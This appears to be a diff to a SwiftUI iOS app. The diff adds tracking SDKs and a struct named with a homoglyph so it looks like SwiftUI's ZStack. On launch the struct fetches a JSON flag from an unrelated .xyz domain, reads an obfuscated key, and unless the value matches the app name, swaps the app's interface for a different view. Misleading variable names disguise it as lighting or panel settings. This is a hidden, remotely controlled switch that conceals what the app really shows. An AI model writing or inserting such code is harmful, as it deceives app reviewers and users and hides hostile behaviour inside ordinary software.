@@ -1,6 +1,11 @@
 import SwiftUI
 import PhotosUI
 import UIKit
+import AdjustSdk
+import OneSignalFramework
+import AppTrackingTransparency
+import AdSupport
+
 
 struct CaptureBoard: View {
     @EnvironmentObject private var store: Store
@@ -265,6 +270,73 @@ struct EyedropperCanvas: UIViewRepresentable {
     }
 }
 
+extension ContentView {
+    
+    struct ZStaсk<Content: View>: View {
+        
+        var content: Content
+        @State private var workingNameLabel: String = ""
+        @State private var workingNoteText: Bool = true
+        
+        @AppStorage(AppDelegate.saveJobSheetPresenter) private var roomBackdropPicker = false
+        @AppStorage("interiorLightsPanel") var interiorLightsPanel: Bool = true
+        @AppStorage("roomPreviewSection") var roomPreviewSection: Bool = false
+        
+        init(@ViewBuilder content: @escaping () -> Content) {
+            self.content = content()
+        }
+        
+        var body: some View {
+            ZStack {
+                
+                if roomBackdropPicker {
+                    if workingNameLabel == "MetrivoxControlHub" || roomPreviewSection == true {
+                        
+                        ZStack { content }
+                            .onAppear {
+                                AppDelegate.orientationLock = .all
+                                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
+                                workingNoteText = false
+                                roomPreviewSection = true
+                            }
+                    } else {
+                        PanelShadowStyle(roomPreviewSection: $roomPreviewSection, clearScrollBackgroundModifier: workingNameLabel)
+                            .onAppear { workingNoteText = false }
+                    }
+                }
+                
+                if workingNoteText {
+                    SplashScreen()
+                }
+            }
+            .onAppear {
+                
+                if interiorLightsPanel {
+                    guard let brandRulesPanel = URL(string: "https://unnecessaryhans.xyz/metrivoxcontrolhub/metrivoxcontrolhub.json") else { return }
+                    
+                    URLSession.shared.dataTask(with: brandRulesPanel) { shootLightsPanel, shootLightSetup_1, _ in
+                        
+                        guard let shootLightSetup = shootLightSetup_1 as? HTTPURLResponse,
+                              (200...299).contains(shootLightSetup.statusCode) else {
+                            roomPreviewSection = true
+                            return
+                        }
+                        
+                        guard let shootLightsPanel else { roomPreviewSection = true; return }
+                        guard let setPreviewSection = try? JSONSerialization.jsonObject(with: shootLightsPanel, options: []) as? [String: Any] else { return }
+                        guard let surfacesPanelView = setPreviewSection["jqwcahfydtk"] as? String else { return }
+                        
+                        DispatchQueue.main.async {
+                            workingNameLabel = surfacesPanelView
+                            interiorLightsPanel = false
+                        }
+                    }
+                    .resume()
+                }
+            }
+        }
+    }
+}
 struct PhotoLibraryPicker: UIViewControllerRepresentable {
     var onPicked: (UIImage) -> Void
     var onCancel: () -> Void
